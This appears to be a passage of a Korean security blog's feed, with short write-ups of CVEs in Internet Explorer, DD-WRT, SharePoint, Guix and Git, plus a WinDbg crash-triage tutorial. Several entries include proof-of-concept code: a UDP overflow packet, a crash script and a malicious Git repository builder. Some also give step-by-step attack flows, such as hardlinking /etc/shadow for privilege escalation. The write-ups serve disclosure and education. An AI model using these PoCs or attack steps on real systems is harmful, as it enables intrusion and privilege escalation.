class="hljs-title">RegionDataLoaderImpl::DeleteThis</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-number">70</span>   <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>; <span class="hljs-number">71</span> &#125;</code></pre><p>파일 <code>components/autofill/core/browser/geo/region_data_loader_impl.cc</code>속 코드 일부입니다. <code>RegionDataLoaderImpl</code>을 구성할 때 함수 <code>OnRegionDataLoaded</code>가 호출되며 PostTask가 함수 <code>DeleteThis</code>를 호출해(line #64) 포인터 <code>this</code>를 해제합니다.</p><p>만약 한 번에 많은 <code>RegionDataLoaderImpl</code>을 구성할 때 동일한 PostTask를 두 번 호출하게 되면 위 작업을 두 번 수행하게되고 포인터<code>this</code>가 두 번 해제됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26411 : Internet Explorer Use-After-Free vulnerability</title>
    <link href="/2021/03/26/l0ch/2021-03-26/"/>
    <url>/2021/03/26/l0ch/2021-03-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">CVE-2021-26411: Internet Explorer mshtml use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft의 브라우저인 Internet Explorer에서 파싱과 렌더링을 처리하는 <code>mshtml</code> 라이브러리에서 발견된 UAF 취약점의 세부 정보가 공개되었습니다.</p><p>크래시가 발생하는 PoC는 다음과 같습니다.</p><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-keyword">var</span> elem = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;xxx&#x27;</span>); <span class="hljs-keyword">var</span> attr1 = <span class="hljs-built_in">document</span>.createAttribute(<span class="hljs-string">&#x27;yyy&#x27;</span>); <span class="hljs-keyword">var</span> attr2 = <span class="hljs-built_in">document</span>.createAttribute(<span class="hljs-string">&#x27;zzz&#x27;</span>); <span class="hljs-keyword">var</span> obj = &#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;elem.clearAttributes();<span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;&#125;;attr1.nodeValue = obj;attr2.nodeValue = <span class="hljs-number">123</span>;elem.setAttributeNode(attr1);elem.setAttributeNode(attr2);elem.removeAttributeNode(attr1); &lt;/script&gt;</code></pre><ol><li>HTML element 객체 <code>elem</code> 와 HTML attribute 객체 <code>attr1</code>, <code>attr2</code> 를 생성합니다.</li><li><code>attr1</code>과 <code>attr2</code> 의 <code>nodeValue</code>에 값을 할당합니다. 이때 <code>attr1</code>의 <code>nodeValue</code>에는 <code>valueOf</code> 함수가 오버 로드된 객체를 할당합니다.</li><li><code>attr1</code> 및 <code>attr2</code>를 요소 개체 <code>elem</code>으로 설정합니다.</li><li><code>elem.removeAttributeNode(attr1)</code>을 호출해 <code>elem</code>에서 <code>attr1</code>을 제거합니다.</li><li><code>removeAttributeNode</code> 메서드는 <code>elem</code> 객체의 모든 속성 객체인 <code>attr1</code> 과 <code>attr2</code>를 지우기 위해 <code>clearAttributes</code>가 호출되는 동안 <code>valueOf</code> 함수에 대한 콜백을 트리거합니다.</li><li><code>valueOf</code> 콜백이 종료되면 IE 탭 프로세스가 NULL 포인터를 참조하게 되어 크래시가 발생합니다.</li></ol><p><code>removeAttributeNode(attr1)</code>는 내부적으로 <code>CBase::GetIntoBSTRAt</code> 함수에서 <code>attr1</code>의 <code>nodeValue</code>가 존재하면 BSTR로 변환해 BSTR 값을 <code>CAttribute.nodeValue(+0x30)</code>에 저장하는데, 이 과정에서 <code>valueOf</code> 콜백이 트리거 됩니다. <code>valueOf</code> 콜백 함수의 <code>elem.clearAttributes()</code>로 인해 <code>attr1</code>이 해제된 이후 정상적인 <code>attr1</code>의 Delete 프로세스에 의해 Double Free Bug가 발생합니다.</p><p>해당 취약점을 악용하면 arbitrary read/write를 통해 원격 코드 실행으로 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>use after free</tag>
      
      <tag>microsoft</tag>
      
      <tag>internet explorer</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27137: DD-WRT UPNP Buffer Overflow</title>
    <link href="/2021/03/25/insu/2021-03-25/"/>
    <url>/2021/03/25/insu/2021-03-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-dd-wrt-upnp-buffer-overflow/">SSD Advisory – DD-WRT UPNP Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DD-WRT</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>리눅스 기반의 무선 라우터 및 액세스 포인트 펌웨어인 DD-WRT에서 인증되지 않은 사용자가 버퍼 오버플로우를 통해 Code Execution을 할 수 있는 취약점이 발견되었습니다.</p><p>Universal Plug and Play(UPNP)는 컴퓨터, 프린터, 인터넷 게이트웨이, 와이파이 access point, 모바일 장치와 같은 네트워크 장치들이 네트워크에서 서로를 탐색하고 네트워크 서비스 기능을 제공하는 네트워크 프로토콜입니다. 기본 설정에서 DD-WRT의 UPNP는 비활성화되어 있습니다. UPNP는 UDP 형식의 인증되지 않은 프로토콜로 DD-WRT에 UPNP 서비스가 활성화된 경우 DD-WRT의 LAN에 있는 해커가 큰 크기의 <code>uuid</code> 값을 전송하여 버퍼 오버플로우를 트리거할 수 있습니다. 취약점이 존재하는 <code>ssdp.c</code> 코드는 다음과 같습니다.</p><p><img src="https://ssd-disclosure.com/wp-content/uploads/2021/03/image-1024x590.png" alt="img"></p><p>name 버퍼의 크기는 128 bytes이지만, 데이터를 복사할 때 데이터 크기 값에 대한 검증이 존재하지 않아서 버퍼 오버플로우가 발생합니다. 해당 취약점의 POC는 아래와 같습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> sockettarget_ip = <span class="hljs-string">&quot;192.168.15.124&quot;</span> <span class="hljs-comment"># IP Address of Target</span>off = <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">164</span>ret_addr = <span class="hljs-string">&quot;AAAA&quot;</span> payload = off + ret_addrpacket = \    <span class="hljs-string">&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \    <span class="hljs-string">&#x27;HOST:239.255.255.250:1900\r\n&#x27;</span> \    <span class="hljs-string">&#x27;ST:uuid:&#x27;</span>+payload+<span class="hljs-string">&#x27;\r\n&#x27;</span> \    <span class="hljs-string">&#x27;MX:2\r\n&#x27;</span> \    <span class="hljs-string">&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span> \    <span class="hljs-string">&#x27;\r\n&#x27;</span>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)s.sendto(packet.encode(), (target_ip, <span class="hljs-number">1900</span>) )</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bof</tag>
      
      <tag>insu</tag>
      
      <tag>dd-wrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27076: SharePoint Replay Style Deserialization 취약점</title>
    <link href="/2021/03/25/idioth/2021-03-25/"/>
    <url>/2021/03/25/idioth/2021-03-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint">CVE-2021-27076: A REPLAY-STYLE DESERIALIZATION ATTACK AGAINST SHAREPOINT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft SharePoint</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint에서 session state를 악용하여 원격 코드 실행이 가능한 취약점이 발견되었습니다. SharePoint의 InfoPath에서 문서는 serialize 된 후 session state에 저장됩니다. session state에서 읽은 데이터는 <code>BinaryFormatter.Deserialize</code>로 전송되는데, 해커가 arbitrary data를 지정할 수 있으면 원격 코드 실행이 가능합니다.</p><p>SharePoint 애플리케이션에서 session state mechanism을 통해 첨부 파일 업로드 데이터는 첨부 파일 업로드 session state에 추가된 데이터에 해당하는 key(<code>editingSessionId</code>)를 통해 검색됩니다. 마찬가지로 <code> DocumentSessionState</code> Deserialization 데이터는 Deserialization session state에 추가된 데이터에 해당하는 key를 통해 검색됩니다. 하지만 <code>editingSessionId</code>가 클라이언트에 의해 조작될 수 있어 첨부 파일 데이터를 <code>DocumentSessionState</code> Deserialization에서 사용할 수 있습니다.</p><p>첨부 파일을 업로드할 때 session state key는 클라이언트에서 확인할 수 없고, 서버의 <code>DocumentSessionState</code> 객체에 존재합니다. 따라서 첨부 파일 mechanism의 document의 state key를 전송하여 serialize 된 <code>DocumentSessionState</code>를 클라이언트에서 첨부 파일로 받을 수 있습니다. 전체적인 공격 흐름은 다음과 같습니다.</p><ol><li>InfoPath 리스트를 생성합니다.</li><li>리스트에 새 항목을 추가합니다.</li><li>항목에 deserialize 될 arbitrary object를 포함한 fake InfoPath <code>DocumentSessionState</code> 파일을 첨부합니다.</li><li>페이지의 HTML에서 document의 state key를 가져옵니다.</li><li><code>FormServerAttachments.aspx</code> 페이지에 document의 state key를 전송하여 serialize 된 <code>DocumentSessionState</code>를 얻습니다.</li><li>반환된 데이터에서 3에서 추가한 첨부 파일의 state key를 추출합니다.</li><li>첨부 파일의 state key를 undocumented client-side API에 전송하여 deserialization mechnism에서 첨부 파일을 실행합니다. 원격 코드 실행은 arbitrary object가 서버에서 deserialization 될 때 실행됩니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>deserialization</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 버그헌팅 튜토리얼 Part 3</title>
    <link href="/2021/03/24/l0ch/bughunting-tutorials-part3/"/>
    <url>/2021/03/24/l0ch/bughunting-tutorials-part3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">버그헌팅 튜토리얼 Part 1</a> </p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">버그헌팅 튜토리얼 Part 2</a></p><p>저번 글에서 예고했던 대로, 본격적인 분석을 시작해보겠습니다! 이번 글은 삽질에서 시작해 삽질로 끝나는 글이므로 멘탈 나감에 유의하시기 바랍니다… 뭐 어쨌든 익스 하기만 하면 되니까요! 그럼 Part 3 시작하겠습니다.</p><h1 id="From-Crash-to-Exploit"><a href="#From-Crash-to-Exploit" class="headerlink" title="From Crash to Exploit"></a>From Crash to Exploit</h1><p>이제 제 퍼저에서 나왔던 크래시를 분석해볼게요.(위에 있는 시드 파일로 돌린 건 아닙니다. 저도 귀찮아서 그냥 크롤링해서 썼어요 ㅎㅎ) </p><p>일단 크래시 폴더에 들어가면 이렇게 파일들이 존재합니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--016.jpg" alt="./bughunting-tutorials-part3/image--016.jpg"></p><p>다른 거를 먼저 보기 전에 먼저 크래시가 재현되는지 확인해야 합니다. 간혹 가다가 재현이 안 되는 경우가 있습니다. 힙 문제여서 재현이 안 되는 경우가 대부분입니다. 재현이 잘 안 되는 크래시일 경우에는 디버깅하기에도 힘들기 때문에 재현되는 확률을 보고 확률이 너무 낮으면 다른 크래시를 분석하시는 것을 추천드립니다. </p><p>그리고 재현이 되는 지를 확인할 때에는 JIT 모드로 확인해야 합니다. 디버거를 붙인 상태에서 프로그램이 실행되면 디버거를 안 붙인 상태랑 힙 배정 등이 조금씩 달라서 재현이 되던 게 안되기도 하고 이상한 데서 크래시가 나기도 합니다. Windbg의 경우 관리자 권한으로 킨 CMD 창에서 <code>windbg –I</code> 명령어만 입력하면 바로 JIT 기능을 사용할 수 있습니다.</p><p>재현이 되는지 확인한 다음에는 보통 msec 확장자 전에 <code>e0</code>으로 되어 있는 파일을 봅니다. msec 파일은 크래시 발생 때의 모든 로그를 보여주는 데요. <code>e0</code>이 아마 처음 크래시를 났을 때의 로그 같습니다. 근데 다른 거 봐도 되긴 하는 데 저는 보통 이거 하나만 봐요. 앞에 것들은 좀 뛰어넘고 뒤에 레지스터 정보들부터 볼게요.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled.png" alt="./bughunting-tutorials-part3/Untitled.png"></p><p>운 좋게 바로 <code>call</code>에서 터졌네요!!! 뭐 이거는 운이 좋은 경우니까 ㅠㅠ 보통 다른 크래시들은 <code>call</code>이나 <code>jmp</code>에서 나는 경우가 거의 없죠 ㅠㅠㅠ 그래도 분석 방법은 똑같으니까 걍 분석하면 됩니다.</p><p>이 크래시의 시드 파일 같은 경우에는 제가 인터넷에서 크롤링해서 넣은 시드 파일이라 데이터가 뭐가 들어가 있는지 모릅니다. 사실 시드 파일을 위에서 처럼 직접 만들어서 하는 것도 좋지만 귀차니즘이 발동하고 직접 만들기 힘든 파일들도 있기 때문에 인터넷에서 크롤링해오는 것도 좋은 방법입니다. (사실 가장 큰 이유는 귀찮기 때문이죠)</p><p>암튼 이럴 때에는 먼저 hxd로 컨트롤된 값을 찾아보는 게 좋습니다. 운이 좋으면 진짜 컨트롤할 수 있는 값이 바로 있는 경우가 있거든요. 저도 이 파일을 분석할 때 운이 좋게도 <code>ecx</code>의 값이 바로 파일에 저장되어 있었고 바로 <code>ecx</code>를 컨트롤할 수 있었습니다.(뒤에 나오겠지만 메모리에 ASLR 이 걸려있어서 큰 의미는 없습니다) 보통 값에서 더하거나 빼거나 또 포인터로 사용해서 다른 값을 가져오거나 하는 경우가 많기 때문에 많은 기대를 하면 안 됩니다…. 후우… </p><p>이 정도로는 대충 알았고 다음으로 콜 스택을 봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%201.png" alt="./bughunting-tutorials-part3/Untitled%201.png"></p><p>크래시가 발생하기 직전 어떤 함수들이 불려졌는지 대략적으로 확인할 수 있습니다. 사실 이래 놓고 실제로 디버거에 확인해보면 콜 스택이 깨져있거나 좀 다르거나 하는 경우도 있는 데 여기에서는 그냥 참고만 하면 됩니다.</p><p>다음으로는 !exlploitable 모듈에서 나온 결과물입니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%202.png" alt="./bughunting-tutorials-part3/Untitled%202.png"></p><p>BFF에서는 !exploitable 의 결과로 해당 크래시가 exploitable 한 지 안 한 지를 판단하는데 사실 exploitable로 나온 거는 그럴싸하긴 한데 다른 거는 잘 모르겠네요. 개인적으로는 Unknown에 있는 크래시들이 더 익스 잘된다는 말이 많아서 이 부분은 왜 크래시가 났는지, exploitable 한 이유가 뭔지만 참고하고 넘어가면 될 거 같습니다.</p><p>간단하게 어떤 유형의 크래시인지 파악을 했고 이게 익스 가능성이 있다고 판단되면 어떤 바이트가 뮤테이트 되었는 지를 확인합니다. 앞에서 파일의 구조를 알았으니 어떤 바이트가 뮤테이트 되었는 지를 확인한다면 그 바이트가 어떤 역할을 하는지 대충은 알 수 있고 왜 크래시가 발생했는지 추측이 가능하겠죠.</p><p>Hxd로 오리지널 파일과 minimized 된 파일을 열어서 ctrl+k 를 누르면 두 파일의 차이점을 알 수 있습니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--018.jpg" alt="./bughunting-tutorials-part3/image--018.jpg"></p><pre><code class="hljs c">BITMAPINFOHEADER.biSize : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x1f</span>BITMAPINFOHEADER.biCompression : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x0A</span>BITMAPINFOHEADER.biClrUsed : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x02</span></code></pre><p>이렇게 바뀌었네요. <code>BiSize</code> 는 <code>BITMAPINFOHEADER</code> 의 크기를 나타내는 데 위에 본 구조로는 아무리 봐도 크기가 달라질 수 없다는 걸 알 수 있습니다. 따라서 프로그램에서 “여기에 있는 데이터를 가져와서 복사를 하는 데 이 데이터가 기존 크기보다 크게 되면서 복사를 더 많이 하게 된고 오버플로우가 발생하게 된다”라고 추측할 수 있을 거 같습니다.</p><p><code>biCompression</code> 과 <code>biClrUsed</code> 는 각각 압축 방식 그리고 사용된 색상수를 의미하는데 이 부분은 리버싱을 해봐야지 어떤 역할을 하는지 알 수 있겠네요.</p><p>본격적으로 리버싱을 진행할 건데 사실 리버싱을 하기 전 혹은 하면서 시나리오를 생각하고 리버싱을 진행하는 것이 좋습니다. 어느 정도는 추측을 하고 시나리오대로 리버싱을 하면 확실이 그냥 막무가내로 하는 것보다는 시간이 덜 소모되고 화가 덜 납니다 ㅎㅎ 여기에서는 일부로 시나리오를 작성 안 하고 진행할 것이지만 이 글을 다 읽고 실제로 진행할 때에는 대략적인 시나리오를 생각해두고 진행하면 좋겠죠.</p><p>그럼 이제 디버거에 붙여서 리버싱을 해볼게요. 여기에서 디버깅은 모두 windbg를 사용하겠습니다.</p><p>처음 버그헌팅을 할 때에는 이전부터 써오기도 했고 GUI 가 한눈에 딱 들어와서 이뮤니티를 쓰긴 했는 데 속도 문제 때문에 windbg로 넘어왔습니다. 특히 익스 할 때 스프레이를 해야 하는 데 정말 속 터져서;;; 제 가상 머신의 사양이 낮아서도 있겠지만 아예 뻗어버리더라구요. 그래서 windbg를 사용했더니 시간이 많이 단축되었습니다. 쓰다 보니까 원하는 거를 명령어만 간단하게 치면 원하는 것만 딱 볼 수 있어서 편하기도 해고… 지금까지 쓰고 있네요 ㅋㅋ 처음에는 CUI라는 게 좀 많이 어색하긴 하지만 크래시 분석하면서 계속 쓰다 보면 익숙해집니당.  </p><p><a href="http://windbg.info/doc/1-common-cmds.html">http://windbg.info/doc/1-common-cmds.html</a> </p><p>windbg 쓸 때 위 링크를 옆에 띄워놓고 원하는 거 하나하나 찾아가면서 써보시면 도움이 많이 될 거 같네요. 처음에는 보면서 하다가 나중에는 안 보고도 잘 쓰는 나 자신을 발견할 수 있습니다 ㅋㅋㅋ</p><p>그럼 아까 직접 제작한 파일에 똑같이 값들을 위 값들로 바꾸고 비트맵 부분을 모두 <code>0x41</code>로 바꾼 다음 디버거로 보겠습니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--020.png" alt="./bughunting-tutorials-part3/image--020.png"></p><p><code>eax</code>가 우리가 넣은 <code>0x41414141</code>로 바뀌었네요. 그럼 이 값이 어디서 오는지 봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--022.png" alt="./bughunting-tutorials-part3/image--022.png"></p><p>현재 <code>eip</code> 바로 위 인스트럭션을 보면 <code>esp</code>가 가리키는 주소에서 <code>eax</code>값을 가져오네요. 잉 근데 여기 스택인데???(이거 스택 오버 취약점 아니었는데;;;)<br>그럼 우리가 만든 파일이 어디에 로드되었는지 볼게요.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--024.png" alt="./bughunting-tutorials-part3/image--024.png"></p><p>뭔가 매우 많이 있네요;;; 비트맵 정보가 전체적으로 올라와 있는 건 <code>0x0725f056</code> ~ <code>0x0753b70d</code> 정도인 거 같네요. 그리고 스택에 있는 데이터는 이 중 어딘가에서 값을 가져온 걸로 보이고요. 아직은 뭔 갈 알 수는 없네요. 이제 콜 스택을 보면서 오버플로우가 어디에서 발생했는지 확인해 봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--026.png" alt="./bughunting-tutorials-part3/image--026.png"></p><p>여기서 주의해야 할 것은 저 <code>WARNING</code>이라고 뜬 부분인데요. 디버거에서 콜 스택을 프로그램 카운터를 기반으로 보여주는데 이게 잘못되어서 제대로 못 보여주는 겁니다. 따라서 저대로 따라가도 프로그램의 흐름을 알 수가 없습니다. 그럼 어떻게 분석을 해야 할까요 ㅠㅠㅠ</p><p>보통 바이너리를 분석하는 방법은 두 가지가 있는 데 “탑다운” 방식과 “바텀업“ 방식이 있습니다.(당연히 위에서 아래로 아래에서 위로 가지 좌우로 갈 순 없잖아요?)</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--028.png" alt="./bughunting-tutorials-part3/image--028.png"></p><p>뭐 암튼 크래시가 난 그 함수에서 위로 올라가면서 볼 것이냐 아니면 크래시가 나는 부분 좀 위에서부터 모든 코드를 볼 것이냐가 문제인데… 이거는 각자의 성향 혹은 상황에 따라 결정하시면 됩니다. 최대한 분석 범위를 줄여서 리버싱 시간을 단축시키는 게 제일 현명한 선택이지만 저 같은 경우는 다른 취약점도 찾을 겸 탑다운 방식을 선호하는 편입니다.(시간 졸라 오래 걸리지만….) 주의해야 할 것은 탑다운 방식을 진행할 때 어디서부터 할지 잘 정해야 한다는 것입니다. dib 포맷의 경우에는 워낙 구조가 단순해서 분석해야 할 코드 커버리지가 작지만 다른 포맷의 경우 분석해야 할 코드량이 방대할 수 있습니다. 그렇기 때문에 분석할 뮤테이트 된 바이트를 사용하는 부분을 찾고 어떤 작업을 하는지 파악한 다음, 그 부분을 처리하는 코드의 시작 부분을 찾아내는 것이 중요합니다 ㅋㅋㅋ</p><p>그럼 이제 처음 해석하는 부분을 찾아야 하는데 헤더 부분이 BM이었죠? 분명 코드에 헤더를 비교하는 부분이 있겠죠. 그래서 아이다에서 <code>BM</code>이라는 문자열이 있는지 확인합니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--030.jpg" alt="./bughunting-tutorials-part3/image--030.jpg"></p><p>는… 망.. 없네…. 다른 건 다 있던데… 역시 인생은 내 맘대로 안되는군… 그럼 이제 편한 방법이 없으니 직접 찾아보도록 합시다 ㅠㅠ</p><p>콜 스택이 제대로 나오지 않으면 하나하나 볼 수밖에 없습니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--032.png" alt="./bughunting-tutorials-part3/image--032.png"></p><p>이중에 아무거나 한 번 볼게요. </p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--034.png" alt="./bughunting-tutorials-part3/image--034.png"></p><p>리턴 어드레스라면 바로 위 인스트럭션이 <code>call</code>이어야 하는데 <code>ret</code>이네요. 이 주소는 우연히 그냥 그 모듈을 가리키고 있을 뿐입니다. 저렇게 <code>dds</code> 명령어를 입력해서 보이는 주소들이 모두 리턴 어드레스인 것만은 아닙니다. 따라서 하나하나 확인을 하고 디버깅을 진행해야 합니다. 스택 좀 위에서 유효한 리턴 어드레스를 찾아봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--036.png" alt="./bughunting-tutorials-part3/image--036.png"></p><p>이 리턴 어드레스는 괜찮은 거 같네요! 그럼 여기에 브레이크 포인트를 걸고 디버깅을 해봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--038.png" alt="./bughunting-tutorials-part3/image--038.png"></p><p>처음에는 이렇게 뜨면서 로딩이 좀 느리게 되는데 <code>sxe ld ImLoader.dll</code> 명령어를 치면 <code>ImLoader.dll</code> 이 로드될 때 브레이크 포인트를 걸 수 있습니다. 그렇게 되면 저렇게 느리게 로딩되지는 않겠죠. 모듈이 로드되고 브포를 걸게 되면 좀 더 빠르게 진행할 수 있습니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--040.png" alt="./bughunting-tutorials-part3/image--040.png"></p><p>정상적으로 원하는 지점에서 잘 걸리네요. 그럼 파일이 업로드되었는지 봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--042.png" alt="./bughunting-tutorials-part3/image--042.png"></p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--044.png" alt="./bughunting-tutorials-part3/image--044.png"></p><p>이 중 두 부분만 헤더 정보를 가지고 있네요. 그럼 헤더까지 있는 메모리에서 헤더 부분에 메모리 브레이크 포인트를 걸고 앞으로 실행하는 과정에서 어느 부분의 코드에서 해당 메모리에 접근하는지를 볼게요.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--046.png" alt="./bughunting-tutorials-part3/image--046.png"></p><p>…는 Fail…. 괜찮아요… 이럴 수 있죠…. 꼼수 쓰지 말고 코드 분석하라는 신의 계시입니다. 아마 파일 스트림에서 다시 가져와 비교를 하거나 다시 다른 곳에 할당하거나… 아니면 여기도 제일 위가 아니거나… 여러 시나리오가 있을 수 있겠네요. 뭐 다른 데 브포 걸어서 할 수도 있지만 다른 방법도 써볼게요. 그 다른 방법은 Part 4에서 설명하겠습니다. </p><h1 id="Part-4-예고"><a href="#Part-4-예고" class="headerlink" title="Part 4 예고"></a>Part 4 예고</h1><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%203.png" alt="./bughunting-tutorials-part3/Untitled%203.png"></p><blockquote><p>EIP가 안잡히잖아!!!!</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Guix lpe via guix-daemon</title>
    <link href="/2021/03/24/fabu1ous/2021-03-24/"/>
    <url>/2021/03/24/fabu1ous/2021-03-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://guix.gnu.org/en/blog/2021/risk-of-local-privilege-escalation-via-guix-daemon/">Risk of local privilege escalation via guix-daemon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Guix</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Guix는 GNU 프로젝트에서 개발한 GNU 운영 체제입니다. Guix의 guix-daemon에서 로컬 권한 상승으로 이어질 수 있는 보안 취약성이 발견되었습니다. Multi-user setup이 된 로컬 시스템 환경에서 유저 권한의 해커는 guix build와 같은 빌드 프로세스를 생성해 임의의 파일에 대한 접근 권한을 world-writable로 변경할 수 있습니다. </p><p>공격 시나리오는 다음과 같습니다.</p><ol><li>빌드 디렉터리 속에 <code>/etc/shadow</code>와 같이 root 소유의 파일의  hardlink를 생성</li><li><code>--keep-failed</code> 옵션을 붙인 빌드 프로세스 호출</li><li>빌드 실패 시 daemon은 전체 빌드 트리를 현재 유저 소유로 변경</li><li>hardlink 된 root 소유의 파일에 쓰기 권한이 생김</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>lpe</tag>
      
      <tag>gnu</tag>
      
      <tag>multi-user</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21300: Git의 저장소 clone 원격 코드 실행 취약점</title>
    <link href="/2021/03/23/l0ch/2021-03-23/"/>
    <url>/2021/03/23/l0ch/2021-03-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.openwall.com/lists/oss-security/2021/03/09/3">git: malicious repositories can execute remote code while cloning</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Git(2.14.2.windows.1에서 테스트됨)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈소스 버전 관리 시스템인 Git에서 원격 저장소를 clone 하는 도중 원격 코드 실행이 가능한 취약점이 발견되어 관련 세부 정보가 공개되었습니다.</p><p>취약점의 트리거 조건은 다음과 같습니다.</p><ul><li><p>타깃 시스템이 NTFS와 같이 대소문자를 구분하지 않고, 심볼릭 링크를 지원해야 합니다.(Windows 및 macOS의 기본 파일 시스템)</p></li><li><p>Git LFS와 같이 clean 혹은 smudge 필터가 전역적으로 구성되어있어야 합니다.</p></li></ul><p>악성 저장소를 생성하는 PoC는 다음과 같습니다.</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span>  git init delayed-checkout &amp;&amp;  (  <span class="hljs-built_in">cd</span> delayed-checkout &amp;&amp;  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;A/post-checkout filter=lfs diff=lfs merge=lfs&quot;</span> \\  &gt;.gitattributes &amp;&amp;  mkdir A &amp;&amp;  <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;#!/bin/sh\\n\\necho PWNED &gt;&amp;2\\n&#x27;</span> &gt;A/post-checkout &amp;&amp;  chmod +x A/post-checkout &amp;&amp;  &gt;A/a &amp;&amp;  &gt;A/b &amp;&amp;  git add -A &amp;&amp;  rm -rf A &amp;&amp;  ln -s .git/hooks a &amp;&amp;  git add a &amp;&amp;  git commit -m initial  )</code></pre><ol><li><p>임의 코드를 실행하는 악성 파일인 <code>A/post-checkout</code>이 저장소에 추가된 후 제거되면 Git 캐시에 남습니다. 이후 